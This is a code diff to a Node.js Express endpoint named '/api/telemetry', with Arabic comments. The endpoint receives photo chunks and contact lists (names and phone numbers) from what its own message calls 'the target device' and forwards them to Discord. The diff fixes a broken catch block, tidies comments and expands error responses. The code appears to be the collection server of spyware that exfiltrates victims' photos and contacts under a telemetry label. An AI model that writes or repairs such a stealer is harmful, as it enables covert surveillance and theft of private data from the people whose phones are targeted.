@@ -33,7 +33,6 @@ app.post('/api/telemetry', async (req, res) => {
 
         // التحقق مما إذا كانت البيانات المرسلة عبارة عن صور (تحتوي على photo_chunk)
         if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
-            // بما أن ديسكورد لا يقبل سلاسل Base64 الطويلة جداً في النصوص، سنقوم بتحويلها إلى ملف مرفق (Attachment) أو إشعارصول صورة
             discordPayload = {
                 content: `📸 **تم استلام جزء صورة جديد بنجاح من الجهاز المستهدف!**`,
                 embeds: [
@@ -46,10 +45,10 @@ app.post('/api/telemetry', async (req, res) => {
                 ]
             };
         } 
-        // التحقق مما إذا كانت البيانات المرسلة عبارة عن جهات اتصال (Array من الأزرار أو الأسماء)
+        // التحقق مما إذا كانت البيانات المرسلة عبارة عن جهات اتصال
         else if (Array.isArray(body)) {
             descriptionText = body.map(c => `👤 **${c.name || 'بدون اسم'}**\n📞 \`${c.phone || 'بدون رقم'}\``).join('\n\n');
-            if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '... (تم اقتصاص القسط الطويل)';
+            if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '... (تم اقتصاص النص الطويل)';
 
             discordPayload = {
                 embeds: [
@@ -88,10 +87,13 @@ app.post('/api/telemetry', async (req, res) => {
 
         return res.status(200).json({ success: true, message: 'Telemetry processed and sent to Discord.' });
 
-    } else (error) { // تم التصحيح إلى catch
     } catch (error) {
         console.error('❌ فشل إرسال التقرير إلى ديسكورد:', error.message);
-        return res.status(500).json({ success: false, error: error.message });
+        return res.status(500).json({ 
+            success: false, 
+            error: 'Internal Server Error while processing telemetry after retries.',
+            details: error.message 
+        });
     }
 });
 
